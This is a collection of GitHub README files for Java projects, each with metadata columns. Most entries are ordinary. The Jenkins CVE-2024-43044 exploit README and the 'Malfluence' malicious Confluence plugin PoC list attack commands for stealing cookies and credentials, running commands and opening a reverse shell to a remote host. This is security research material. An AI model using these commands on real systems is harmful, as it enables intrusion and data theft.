The projects included cover a wide array of topics within the DevOps domain, providing practical experience and insights into real-world scenarios.

### Why Explore This Repository?

Whether you're new to DevOps or looking to enhance your skills, this repository offers valuable resources and projects to help you learn and grow in the field.

### Contribute and Collaborate

Feel free to contribute your own DevOps projects or collaborate with others in enhancing existing projects. Let's build a thriving community of DevOps enthusiasts!

## Hit the Star! ⭐

**If you are planning to use this repository for learning, please give it a star. Thanks!**

### Author by:

![](https://imgur.com/2j6Aoyl.png)

> [!Note]
> Join Our [Telegram Community](https://t.me/prodevopsguy) || [Follow me](https://github.com/NotHarshhaa) for more DevOps Content
",0,0,1,0.0,"['project', 'for', 'learning', 'devops', 'real', 'world', 'project', 'aspiring', 'devops', 'engineer', 'beginner', 'advanced', 'repository', 'content', 'devops', 'project', 'beginner', 'advanced', 'level', 'integration', 'devops', 'technology', 'other', 'technology', 'project', 'scope', 'why', 'explore', 'this', 'repository', 'contribute', 'collaborate', 'hit', 'star', 'author', 'by']","['project', 'devops', 'beginner', 'advanced', 'repository']",5.0,"[maven-checkstyle-plugin,maven-compiler-plugin,maven-javadoc-plugin,maven-jxr-plugin,maven-pmd-plugin,maven-project-info-reports-plugin,maven-release-plugin,maven-resources-plugin,maven-site-plugin,maven-surefire-plugin,maven-surefire-report-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.apache.maven.plugins:maven-war-plugin,org.codehaus.mojo:findbugs-maven-plugin,org.codehaus.mojo:taglist-maven-plugin,org.jacoco:jacoco-maven-plugin,org.mortbay.jetty:jetty-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",2.0,2.0,1.0
convisolabs/CVE-2024-43044-jenkins,master,"## Intro
This is an exploit for CVE-2024-43044, an arbitrary file read that allows an agent to fetch files from the controller.

The exploit will use the vulnerability to read files to forge a remember-me cookie for an admin account and gain access to
Jenkins scripting engine.

Check out the full writeup at https://blog.convisoappsec.com/en/analysis-of-cve-2024-43044/

## Building the exploit
```
mvn package
```

## Running the exploit

```
Exploit Usages:
    java -jar exploit.jar mode_secret <jenkinsUrl> <nodeName> <nodeSecretKey>
    java -jar exploit.jar mode_attach <jenkinsUrl> <cmd>
    java -jar exploit.jar mode_attach <cmd>
```


## Testing 

You can test it in vulnerable version using docker:

```
docker run -p 8080:8080 -p 50000:50000 --restart=on-failure jenkins/jenkins:2.441-jdk17
```

Once you have a jenkins runnning, setup an agent.

The controller/agent connection can be either default (using url, nodename, secret) or via SSH.

## Demonstration

![RCE](./assets/rce_mode_secret.gif).


## References

https://www.jenkins.io/security/advisory/2024-08-07/
",0,0,3,0.0,"['intro', 'building', 'exploit', 'run', 'exploit', 'test', 'demonstration', 'reference']","['exploit', 'intro', 'building', 'run', 'test']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0
Mark-Langston/Marks_Computer_Builds_Remote,master,"# Mark's Computer Builds - Remote

Mark's Computer Builds is a JavaFX application that allows users to manage and organize their computer builds. The application integrates with a remote PostgreSQL database to store and retrieve build information.

## Features

- Add, edit, and remove computer builds
- Secure login system
- Integration with a remote PostgreSQL database

## Video Demonstration

Watch a short demo of the project:

[![Mark's Computer Builds - Demo](https://img.youtube.com/vi/warFaJIbG7M/0.jpg)](https://youtu.be/warFaJIbG7M)

## Getting Started

### Prerequisites

- Java JDK 21
- PostgreSQL database
- Maven

### Installation

1. Clone the repository:
    ```sh
    git clone https://github.com/Mark-Langston/Marks_Computer_Builds_Remote.git
    cd Marks_Computer_Builds_Remote
    ```

2. Set up the PostgreSQL database:
    - Create a new database and two tables using the following SQL commands:

    ```sql
    CREATE TABLE markscomputerbuilds (
        title TEXT PRIMARY KEY,
        case_type TEXT,
        motherboard TEXT,
        cpu TEXT,
        cpu_cooler TEXT,
        ram TEXT,
        gpu TEXT,
        power_supply TEXT,
        mass_storage TEXT
    );

    CREATE TABLE users (
        username TEXT PRIMARY KEY,
        password TEXT NOT NULL
    );

    -- Insert a sample user for testing
    INSERT INTO users (username, password) VALUES ('admin', '12345');
    ```

3. Update the `config.properties` file with your database credentials:
    ```properties
    remote.db.url=jdbc:postgresql://your_database_url:port/your_database_name
    remote.db.user=your_database_user
    remote.db.password=your_database_password
    ```

4. Build and run the application using Maven:
    ```sh
    mvn clean install
    mvn javafx:run
    ```

## Usage

1. Run the application.
2. Log in using the username and password set up in the PostgreSQL database.
3. Use the interface to add, edit, and remove computer builds.

## Contributing

Contributions are welcome! Please open an issue or submit a pull request.
",0,0,1,0.0,"['mark', 'computer', 'build', 'remote', 'feature', 'video', 'demonstration', 'get', 'start', 'prerequisite', 'installation', 'usage', 'contribute']","['mark', 'computer', 'build', 'remote', 'feature']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.openjfx:javafx-maven-plugin]",0.0,1.0,0.0
0WhiteDev/Java-Process-Inspector,main,"# Java Process Inspector [JPI] 🖥️

This is a sophisticated tool designed for dynamically browsing, analyzing, and modifying a running Java process ⚡

## Basic information

It allows users to interact with the Java application's live state, inspect its code, and make changes in real-time, offering a powerful solution for everyone, who need deep insights and control over Java applications during execution.

The program has a basic GUI that is easy to use and does not take up much memory.

## Functions

#### 🔧 Dynamic Executor for Java Code: 
This feature allows you to force the program, to which JPI is attached, to execute specific lines of code written in the built-in code editor provided with JPI. It offers full access to use any classes and methods, enabling real-time manipulation and testing of the application’s behavior.

#### ✏️ Memory Editor: 
The Memory Editor is a powerful tool that enables you to search for specific values within the process's memory and dynamically modify them while the process is running. This function provides direct access to the internal state of the application, allowing precise and immediate adjustments.

#### 🔌 DLL Injector: 
A straightforward tool designed to inject DLL files into the process. This function simplifies the process of adding external libraries, enabling extended functionality or modifications to the running application.

#### 🔍 Loaded Class Checker: 
This feature allows you to inspect all the classes loaded by the process, decompile them, and view their source code. Additionally, it provides the capability to dump all loaded classes to a specified folder.

#### 💻 Process Profiler:
Real-time Java process monitoring and profiling solution. Displays performance metrics, resource utilization, process details and enables field inspection, providing a comprehensive overview of the running process.

## How to inject JPI
- To attach JPI to a java process, run Process Injector.exe
- Find the pid of the process you are interested in (java/javaw)
- Enter the pid of the process you want to attach JPI to (confirm with enter)
- Enter the full path to the dll file ""injector.dll"" (confirm with enter) `Example: C:\\Users\\whitedev\\Files\\injector.dll`

## Disclaimer
Remember that modifying memory, dynamically injecting new classes and various modifications in the running java process are quite dangerous and can cause various errors with your application, use this with caution.

## Project Suppot
If you need help, join to our community:
- Discord Server: https://discord.gg/KhExwvqZb5
- WebSite: https://devsmarket.eu/

## Authors

- [@0WhiteDev](https://github.com/0WhiteDev)
- [@DevsMarket](https://github.com/DEVS-MARKET)
",1,0,1,0.0,"['java', 'process', 'inspector', 'jpi', 'basic', 'information', 'function', 'dynamic', 'executor', 'java', 'code', 'memory', 'editor', 'dll', 'injector', 'loaded', 'class', 'checker', 'process', 'profiler', 'how', 'inject', 'jpi', 'disclaimer', 'project', 'suppot', 'author']","['java', 'process', 'jpi', 'inspector', 'basic']",1.0,[],0.0,1.0,0.0
cyllective/malfluence,main,"# Malfluence 
A PoC for a malicious Confluence plugin. Read more about this on [our blog](https://cyllective.com/blog/posts/atlassian-malicious-plugin/).

The general code may also work with slight adjustments in Jira but the plugin cannot be directly installed into Jira. 

## Features
### List & download attachments
```sh
curl ""http://yourserver/rest/maintenance/latest/listattachments?accesskey=<Access Key>""

curl ""http://yourserver/rest/maintenance/latest/getattachment?accesskey=<Access Key>&id=<Attachment ID>"" -O
```
![](media/attachments.png)

### List & download pages
```sh
curl ""http://yourserver/rest/maintenance/latest/listpages?accesskey=<Access Key>""

curl ""http://yourserver/rest/maintenance/latest/getpage?accesskey=<Access Key>&id=<Page ID>""
```
![](media/pages.png)

### Steal cookies
Since the cool cookies have HttpOnly set, this works by first sending a request to the custom endpoint `/getheaders`, which returns all headers base64 encoded into the DOM. Those are then sent to the attacker. 

```sh
# Configure the server which will receive POST requests of users containing base64 encoded headers
curl ""http://yourserver/rest/maintenance/latest/headerexfilconfig?accesskey=<Access Key>&url=<base64 encoded target URL>&enabled={TRUE,FALSE}""
```

```sh
python3 headerserver.py
```
![](media/cookiesteal.gif)

### Steal credentials
```sh
python3 credsserver.py
```
![](media/credssteal.gif)

### Issue HTTP requests through the server
```sh
curl ""http://yourserver/rest/maintenance/latest/proxy?accesskey=<Access Key>&method={GET,POST}&url=<base64 encoded URL>&headers=<base64 encoded headers (name1:value1,nameN:valueN)>&body=<base64 encoded body for POST>""
```
![](media/proxy.png)

### Execute commands on the server
```sh
curl ""http://yourserver/rest/maintenance/latest/exec?accesskey=<Access Key>&cmd=<Command to run>&args=<arg1,arg2,arg3>""
```
![](media/exec.png)

### Spawn a reverse TCP shell
```sh
curl ""http://yourserver/rest/maintenance/latest/revshell?accesskey=<Access Key>&rhost=<Remote Host>&rport=<Remote Port>""
```
![](media/revshell.png)

### Scan for open ports on hosts reachable by the server
```sh
curl ""http://yourserver/rest/maintenance/latest/portscan?accesskey=<Access Key>&ip=<IP address>""
```
![](media/portscan.png)

### Hide plugins from the plugin overview
```sh
curl ""http://yourserver/rest/maintenance/latest/hideplugins?accesskey=<Access Key>&plugins=<com.plugin.hideme,com.plugin.hidemeto>&enabled={TRUE,FALSE}""
```
![](media/hideplugin.gif)",0,0,1,0.0,"['malfluence', 'feature', 'list', 'download', 'attachment', 'list', 'download', 'page', 'steal', 'cooky', 'configure', 'server', 'receive', 'post', 'request', 'user', 'contain', 'encode', 'header', 'steal', 'credential', 'issue', 'http', 'request', 'server', 'execute', 'command', 'server', 'spawn', 'reverse', 'tcp', 'shell', 'scan', 'open', 'port', 'host', 'reachable', 'server', 'hide', 'plugins', 'plugin', 'overview']","['server', 'list', 'download', 'steal', 'request']",2.0,"[com.atlassian.maven.plugins:confluence-maven-plugin,com.atlassian.plugin:atlassian-spring-scanner-maven-plugin]",0.0,0.0,0.0
niqumu/Irminsul,master,"<h1 align=""center"">Irminsul</h1>
<h4 align=""center"">An experimental anime game server implementation, written in Java.</h4>
<br>

![banner](https://github.com/user-attachments/assets/126e13fa-d6c0-4fc5-bfee-735b18b444bb)

Please avoid using the name of the game, game company, or notable content from the game when discussing this project.
This project contains no copyrighted works, and does not constitute copyright infringement. This code simply happens
to implement a certain protocol that some software may happen to support. This project is shared in hopes that it may
be interesting or helpful to people. I am not responsible for how people use this project.

## Credits
- The wonderful [Grasscutter](https://github.com/Grasscutters/Grasscutter) community for helping with protocol research
- Slushy team for their [Beach Simulator](https://github.com/SlushinPS/beach-simulator) protocol definitions
",0,0,1,0.0,['credit'],['credit'],5.0,[],0.0,4.0,1.0
Rapter1990/springbootmicroserviceswithsecurity,main,"# Spring Boot Microservices with JWT Implementation

<p align=""center"">
    <img src=""screenshots/spring_boot_microservices_jwt_implementation_main.png"" alt=""Main Information"" width=""700"" height=""500"">
</p>

### 📖 Information

<ul style=""list-style-type:disc"">
  <li>This project demonstrates a <b>Spring Boot microservices</b> architecture with <b>JWT-based authentication</b> and <b>role-based</b> access control. The setup includes an <b>API Gateway</b> to manage <b>routing</b> and <b>authentication</b>.</li> 
</ul>

<ul style=""list-style-type:disc"">
  <li>Roles and Permissions:
    <ul>
      <li><b>Admin</b> and <b>User</b> roles each have their own authentication and authorization mechanisms defined by their roles.</li>
      <li><b>Admin</b> can:
        <ul>
          <li>Create products</li>
          <li>Retrieve all products</li>
          <li>Retrieve products by ID</li>
          <li>Update products by ID</li>
          <li>Delete products by ID</li>
        </ul>
      </li>
      <li><b>User</b> can:
        <ul>
          <li>Retrieve all products</li>
          <li>Retrieve products by ID</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

### Explore Rest APIs

<table style=""width:100%"">
  <tr>
      <th>Method</th>
      <th>Url</th>
      <th>Description</th>
      <th>Request Body</th>
      <th>Header</th>
      <th>Valid Path Variable</th>
      <th>No Path Variable</th>
  </tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/admin/register</td>
      <td>Admin Register</td>
      <td>AdminRegisterRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/admin/login</td>
      <td>Admin Login</td>
      <td>LoginRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/admin/refreshtoken</td>
      <td>Admin Refresh Token</td>
      <td>TokenRefreshRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/admin/logout</td>
      <td>Admin Logout</td>
      <td>TokenInvalidateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/register</td>
      <td>User Register</td>
      <td>UserRegisterRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/login</td>
      <td>User Login</td>
      <td>LoginRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/refreshtoken</td>
      <td>User Refresh Token</td>
      <td>TokenRefreshRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/logout</td>
      <td>User Logout</td>
      <td>TokenInvalidateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/products</td>
      <td>Create Product</td>
      <td>ProductCreateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>GET</td>
      <td>/api/v1/products/{productId}</td>
      <td>Get Product By Id</td>
      <td></td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
  <tr>
      <td>GET</td>
      <td>/api/v1/products</td>
      <td>Get Products</td>
      <td>ProductPagingRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>PUT</td>
      <td>/api/v1/products/{productId}</td>
      <td>Update Product By Id</td>
      <td>ProductUpdateRequest</td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
  <tr>
      <td>DELETE</td>
      <td>/api/v1/products/{productId}</td>
      <td>Delete Product By Id</td>
      <td></td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
</table>


### Technologies

---
- Java 21
- Spring Boot 3.0
- Restful API
- Lombok
- Maven
- Junit5
- Mockito
- Integration Tests
- Docker
- Docker Compose
- CI/CD (Github Actions)
- Spring Cloud
- Postman
- Spring Security
- JWT

### Postman

```
Import postman collection under postman_collection folder
```


### Prerequisites

#### Define Variable in .env file for product service and user service

```
DATABASE_USERNAME={DATABASE_USERNAME}
DATABASE_PASSWORD={DATABASE_PASSWORD}
```

---
- Maven or Docker
---


### Docker Run
The application can be built and run by the `Docker` engine. The `Dockerfile` has multistage build, so you do not need to build and run separately.

Please follow directions shown below in order to build and run the application with Docker Compose file;

```sh
$ cd springbootmicroserviceswithsecurity
$ docker-compose up -d
```

If you change anything in the project and run it on Docker, you can also use this command shown below

```sh
$ cd springbootmicroserviceswithsecurity
$ docker-compose up --build
```

---
### Maven Run
To build and run the application with `Maven`, please follow the directions shown below;

```sh
$ cd springbootmicroserviceswithsecurity
$ cd eurekaserver
$ mvn clean install
$ mvn spring-boot:run
$ cd ..
$ cd apigateway
$ mvn clean install
$ mvn spring-boot:run
$ cd ..
$ cd authservice
$ mvn clean install
$ mvn spring-boot:run
$ cd ..
$ cd userservice
$ mvn clean install
$ mvn spring-boot:run
$ cd ..
$ cd productservice
$ mvn clean install
$ mvn spring-boot:run
```

---
### Docker Image Location

```
https://hub.docker.com/repository/docker/noyandocker/springbootmicroserviceswithsecurityeurekaserver/general
https://hub.docker.com/repository/docker/noyandocker/springbootmicroserviceswithsecurityapigateway/general
https://hub.docker.com/repository/docker/noyandocker/springbootmicroserviceswithsecurityauthservice/general
https://hub.docker.com/repository/docker/noyandocker/springbootmicroserviceswithsecurityuserservice/general
https://hub.docker.com/repository/docker/noyandocker/springbootmicroserviceswithsecurityproductservice/general
```

### Screenshots

<details>
<summary>Click here to show the screenshots of project</summary>
    <p> Figure 1 </p>
    <img src =""screenshots/eureka_server_image.PNG"">
    <p> Figure 2 </p>
    <img src =""screenshots/docker_image.PNG"">
    <p> Figure 3 </p>
    <img src =""screenshots/0_register_admin.PNG"">
    <p> Figure 4 </p>
    <img src =""screenshots/0_login_admin.PNG"">
    <p> Figure 5 </p>
    <img src =""screenshots/0_refresh_token_admin.PNG"">
    <p> Figure 6 </p>
    <img src =""screenshots/0_logout_admin.PNG"">
    <p> Figure 7 </p>
    <img src =""screenshots/2_register_user.PNG"">
    <p> Figure 8 </p>
    <img src =""screenshots/2_login_user.PNG"">
    <p> Figure 9 </p>
    <img src =""screenshots/2_refresh_token_user.PNG"">
    <p> Figure 10 </p>
    <img src =""screenshots/2_logout_user.PNG"">
    <p> Figure 11 </p>
    <img src =""screenshots/3_create_product_by_user.PNG"">
    <p> Figure 12 </p>
    <img src =""screenshots/1_get_product_by_admin.PNG"">
    <p> Figure 13 </p>
    <img src =""screenshots/3_get_product_by_user.PNG"">
    <p> Figure 14 </p>
    <img src =""screenshots/3_get_products_by_user.PNG"">
    <p> Figure 15 </p>
    <img src =""screenshots/3_update_product_by_admin.PNG"">
    <p> Figure 16 </p>
    <img src =""screenshots/3_delete_product_by_admin.PNG"">
</details>


### Contributors

- [Sercan Noyan Germiyanoğlu](https://github.com/Rapter1990)",0,0,1,1.0,"['spring', 'boot', 'microservices', 'jwt', 'implementation', 'information', 'explore', 'rest', 'apis', 'technology', 'postman', 'prerequisite', 'define', 'variable', 'file', 'product', 'service', 'user', 'service', 'docker', 'run', 'maven', 'run', 'docker', 'image', 'location', 'screenshots', 'contributor']","['service', 'docker', 'run', 'spring', 'boot']",5.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,5.0,0.0
sculkmp/Sculk,main,"<div align=""center"">
<img src=""https://static.wikia.nocookie.net/minecraft_gamepedia/images/e/e2/Sculk_%28pre-release%29.png"" width=""150"" height=""150"" alt=""Logo Sculk"">
<h4>Open source server software for Minecraft: Bedrock Edition written in Java</h4>

[![SculkVersion](https://img.shields.io/badge/version-soon-14191E.svg?cacheSeconds=2592000)]()
[![MinecraftVersion](https://img.shields.io/badge/minecraft-v1.21.21%20(Bedrock)-17272F)]()
[![ProtocolVersion](https://img.shields.io/badge/protocol-712-38D3DF)]()
[![Github Download](https://img.shields.io/github/downloads/sculkmp/Sculk/total?label=downloads%40total)]()
[![License](https://img.shields.io/badge/License-LGPL--3-yellow.svg)]()
[![JitPack](https://jitpack.io/v/sculkmp/Sculk.svg)]()

</div>

## 📖 Introduction
Sculk is open source server software for Minecraft: Bedrock Edition, It has a few key advantages over other server software:

## 🎯 Features
* Written in Java, Sculk is faster and more stable.
* We provided a high-level friendly API akin PocketMine plugin developers. Save yourself the hassle of dealing with the dot-and-cross of the low-level system API and hooks, we've done the difficult part for you!

## ✨ Creating plugins
Add Sculk to your dependencies *(it is hosted by JitPack, so you need to specify a custom repository)*.

For maven:
```xml
<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://jitpack.io</url>
    </repository>
</repositories>
<dependencies>
    <dependency>
        <groupId>com.github.sculkmp</groupId>
        <artifactId>Sculk</artifactId>
        <version>Tag</version>
    </dependency>
</dependencies>
```
For gradle:
```groovy
repositories {
    mavenCentral()
    maven { url 'https://jitpack.io' }
}
dependencies {
    implementation 'com.github.sculkmp:Sculk:Tag'
}
```

| Milestone                                | Status |
|------------------------------------------|--------|
| **⚒️ Construction of the server tree**   | ✅      |
| **👓 Visible server**                    | ✅      |
| **🛜 Join server**                       | ✅      |
| **🎍 World loader**                      | 🚧     |
| **🔌Plugin loader**                      | ⏳      |
| **⌨️ Command System**                    | 🚧     |
| **🔐 Permission System**                 | 🚧     |
| **🎈 Event System**                      | ⏳      |
| **🖼 Scoreboard API**                    | 🚧     |
| **🖼 Form API**                          | ✅      |
| **👤 Player & Actor API**                | ⏳      |
| **🔩 Item API**                          | 🚧     |
| **🧱 Block API**                         | 🚧     |
| **📦 Inventory API**                     | 🚧     |
| **🔬 Beta Testing & Community Feedback** | 🚧     |
| **🚀 Official Release & Support**        | 🚧     |

Here's a legend to guide you:
- ✅: Task is completed. Woohoo! 🎉
- 🚧: Task is under way. We're on it! 💪
- ⏳: Task is up next. Exciting things are coming! 🌠

## ⚒️ Build JAR file
- `git clone https://github.com/sculkmp/Sculk`
- `cd Sculk`
- `git submodule update --init`
- `mvn clean package`
The compiled JAR can be found in the `target/` directory.

## 🚀 Running
Simply run `java -jar Sculk-1.0-SNAPSHOT-jar-with-dependencies.jar`

## 🙌 Contributing
We warmly welcome contributions to the Sculk project! If you are excited about improving Minecraft 
Bedrock server software with Java, here are some ways you can contribute:

### Reporting bugs
If you encounter any bugs while using Sculk, please open an [issue](https://github.com/sculkmp/Sculk/issues) in
our GitHub repository. Ensure to include a detailed description of the bug and steps to reproduce it.

### Submitting a Pull Request
We appreciate code contributions. If you've fixed a bug or implemented a new feature, please submit a pull request!
Please ensure your code follows our coding standards and include tests where possible.

## 📌 Licensing information
This project is licensed under LGPL-3.0. Please see the [LICENSE](/LICENSE) file for details.

`sculkmp/Sculk` are not affiliated with Mojang. 
All brands and trademarks belong to their respective owners. Sculk is not a Mojang-approved software, 
nor is it associated with Mojang.",1,1,9,25.0,"['introduction', 'feature', 'creating', 'plugins', 'build', 'jar', 'file', 'run', 'contribute', 'report', 'bug', 'submit', 'pull', 'request', 'licensing', 'information']","['introduction', 'feature', 'creating', 'plugins', 'build']",1.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin]",0.0,1.0,0.0
mqttsnet/open-exp-plugin,main,"<div align=""center"">

[![MQTTSNET Logo](./docs/images/logo.png)](http://www.mqttsnet.com)

</div>

## ThingLinks Open Exp Plugin | [中文文档](README_zh.md)

# Open Exp Plugin Overview

**Open-Exp-Plugin Sample Marketplace** is a plugin repository based on the ThingLinks Open EXP extension point plugin system. It is designed to demonstrate how to develop, extend, and integrate functionalities within the ThingLinks platform. This marketplace provides a variety of plugin examples to help developers quickly get started and understand the powerful capabilities and flexibility of the plugin system.

## Features

- **Plugin Architecture**: Demonstrates the ThingLinks plugin architecture, supporting various plugin development models.
- **Hot-Swappable Support**: Plugins support dynamic installation and uninstallation at runtime without restarting the main application.
- **Multi-Tenant Support**: Supports loading different plugins based on tenant ID for customized functionality.
- **Modular Design**: Plugins and the main application adopt a modular design, supporting the isolation and integration of extension points and plugins.
- **Classloader Isolation**: Provides Parent First and Self First classloader isolation mechanisms to ensure independence between plugins.

## Usage Example

### How to Use the Plugin Sample Marketplace

1. **Enable Dependencies and Select Plugins**: Enable the `example` related dependencies in the `pom.xml` file of the `open-exp-plugin` module.

   ![img_1.png](docs/images/img_1.png)

2. **Reload Projects**: Reload all Maven projects to ensure the dependencies are correctly loaded.

3. **Clean and Package**: Clean and package the `all-package` module.

   ![img_2.png](docs/images/img_2.png)

4. **After Packaging**: The plugin packages are by default generated in the `exp-plugins` directory.

   ![img_3.png](docs/images/img_3.png)

5. **Start the Main Application**: Run the `Main` class in the `example-springboot3` module.

   The main application will automatically load and install the packaged plugins. If you need to reinstall or uninstall plugins, simply call the relevant API.

### Notes

1. **Configuration Definition**: Plugin configurations should be defined in the `Boot` class.
   ![img_4.png](docs/images/img_4.png)
   Configuration usage:
   ![img_5.png](docs/images/img_5.png)

2. **MQTT Configuration**: In the `example-plugin-tcptomqtt` and `example-plugin-udptomqtt` plugins, MQTT server configurations should be adjusted according to the actual environment.
   ![img_8.png](docs/images/img_8.png)

3. **Annotation Import**: Ensure that the packages imported by the `@PostConstruct` and `@PreDestroy` annotations in the plugin's entry point are correct.
   ![img_7.png](docs/images/img_7.png)

## Core Features

- **Extension Point Interface**: Defines multiple extension point interfaces for plugins to implement.
- **Multi-Tenant Support**: Different tenants can use different plugin implementations, with support for tenant priority sorting and filtering.
- **Hot-Swappable Mechanism**: Supports dynamic loading and unloading of plugins, enhancing system extensibility and flexibility.
- **Classloader Isolation**: Ensures isolation between the plugin and the main application classloader, maintaining independence and security.

## License

[Apache License, Version 2.0](LICENSE)

## Contact

If you have any questions or need support, please contact the community team at mqttsnet@163.com.

## Source Code

The source code for this project is available at: [GitHub Repository](https://github.com/mqttsnet/open-exp-plugin)

## Join Us

We welcome you to join the **MQTTSNET Community**, where you can explore and promote IoT technology development together with developers from around the world. Through the community, you can access the latest technical information, rich development resources, and opportunities to communicate with other developers.

Visit the [ThingLinks Official Website](https://www.mqttsnet.com) for more information and to join our developer community!
",0,0,3,8.0,"['thinglinks', 'open', 'exp', 'plugin', 'open', 'exp', 'plugin', 'overview', 'feature', 'usage', 'example', 'how', 'use', 'plugin', 'sample', 'marketplace', 'note', 'core', 'feature', 'license', 'contact', 'source', 'code', 'join', 'u']","['plugin', 'open', 'exp', 'feature', 'thinglinks']",8.0,"[org.apache.maven.plugins:maven-antrun-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,7.0,1.0
spring-projects-experimental/spring-grpc,main,"# Spring gRPC [![build status](https://github.com/spring-projects-experimental/spring-grpc/actions/workflows/deploy.yml/badge.svg)](https://github.com/spring-projects/spring-grpc/actions/workflows/deploy.yml)

Welcome to the Spring gRPC project!

The Spring gRPC project provides a Spring-friendly API and abstractions for developing gRPC applications.

For further information go to our [Spring gRPC reference documentation](https://docs.spring.io/spring-grpc/reference/).

",0,13,1,10.0,"['spring', 'grpc', 'build', 'status', 'http', 'https']","['spring', 'grpc', 'build', 'status', 'http']",8.0,"[com.mycila:license-maven-plugin,io.spring.javaformat:spring-javaformat-maven-plugin,io.spring.maven.antora:antora-component-version-maven-plugin,io.spring.maven.antora:antora-maven-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-project-info-reports-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jacoco:jacoco-maven-plugin,org.springframework.boot:spring-boot-maven-plugin,org.xolstice.maven.plugins:protobuf-maven-plugin]",0.0,5.0,3.0
pmoustopoulos/customer-api,main,"# Spring Boot 3 Knowledge Sharing

This document is designed to help new Spring Boot developers understand the basics of building applications using Spring
Boot 3. It covers the structure of a sample project [Customer API](https://github.com/pmoustopoulos/customer-api),
explains the purpose of key annotations, and provides insights
into best practices. **Note**: You have also to check the code example and not only this markdown file because some
parts
are not shown here (custom annotations, Utils class etc).

**Disclaimer**: This guide reflects my personal opinion and approach, based on the knowledge I have gained through my
work as a developer and my studies. It is not necessarily the best or only way to do things, and as time passes,
practices and tools may evolve. I encourage you to explore other perspectives and approaches as well.

**Feedback and Contributions**: I am always open to feedback and contributions. If you have suggestions for improvement
or additional insights, please feel free to share. Together, we can make this a valuable resource for anyone learning
Spring Boot 3.

## Table of Contents

1. [Introduction](#1-introduction)
2. [Project Structure Overview](#2-project-structure-overview)
3. [Introduction to Maven and `pom.xml`](#3-introduction-to-maven-and-pomxml)
4. [Key Annotations in Spring Boot](#4-key-annotations-in-spring-boot)
5. [Dependency Injection in Spring Boot](#5-dependency-injection-in-spring-boot)
6. [Design Patterns: RESTful API vs. MVC](#6-design-patterns-restful-api-vs-mvc)
7. [Naming Conventions](#7-naming-conventions)
8. [Configuring `application.yaml`](#8-configuring-applicationyaml)
9. [Detailed Package Breakdown](#9-detailed-package-breakdown)
   - [Entity Layer](#entity-layer)
   - [Repository Layer](#repository-layer)
   - [Service Layer](#service-layer)
   - [DTOs and MapStruct](#dtos-and-mapstruct)
   - [Controller Layer](#controller-layer)
   - [Exception Handling](#exception-handling)
10. [Helper Classes](#10-helper-classes)
11. [Testing](#11-testing)
12. [Best Practices](#12-best-practices)
13. [Enhanced Pagination Example](#13-enhanced-pagination-example)
14. [Appendix: Using
    `openapi-generator-maven-plugin` for API Client Generation](#14-appendix-using-openapi-generator-maven-plugin-for-api-client-generation)
15. [Feedback and Contributions](#15-feedback-and-contributions)

## 1. Introduction

### What is Spring Boot?

Spring Boot is an extension of the Spring framework that simplifies the development of Java applications. It provides
tools and conventions that allow developers to get started quickly without needing to manually configure and set up
complex frameworks.

### Why Use Spring Boot?

- **Auto-configuration**: Automatically configures your application based on the dependencies you add to your project.
- **Embedded Server**: You don’t need to set up an external server like Tomcat; Spring Boot applications can run with
  an embedded server.
- **Production-Ready**: Includes features like health checks, metrics, and externalized configuration, making it easy
  to deploy applications in a production environment.

---

## 2. Project Structure Overview

Understanding the structure of a Spring Boot project is crucial for effective development. Below is the typical
structure
of a sample Spring Boot 3 project. Please note this is something I follow based on the knowledge I gained from other
developers.
Furthermore, some packages can be skipped in case based on your use case you do not need them.

```
├── config
├── controller
├── dto
├── entity
├── enums
├── exception
├── filter
├── mapper
├── repository
├── service
│   └── impl
└── utils
```

### Packages and Their Purpose

- **`config`**: Contains configuration classes for application-wide settings (e.g., security, open api).
- **`controller`**: REST controllers handling HTTP requests, routing them to services (**note**: do not add logic here).
- **`dto`**: Data Transfer Objects (DTOs) used for transferring data between client and server.
- **`entity`**: JPA entities that represent database tables.
- **`enums`**: Enumerations used across the application.
- **`exception`**: Custom exceptions and a global exception handler.
- **`filter`**: Request filtering and logging logic.
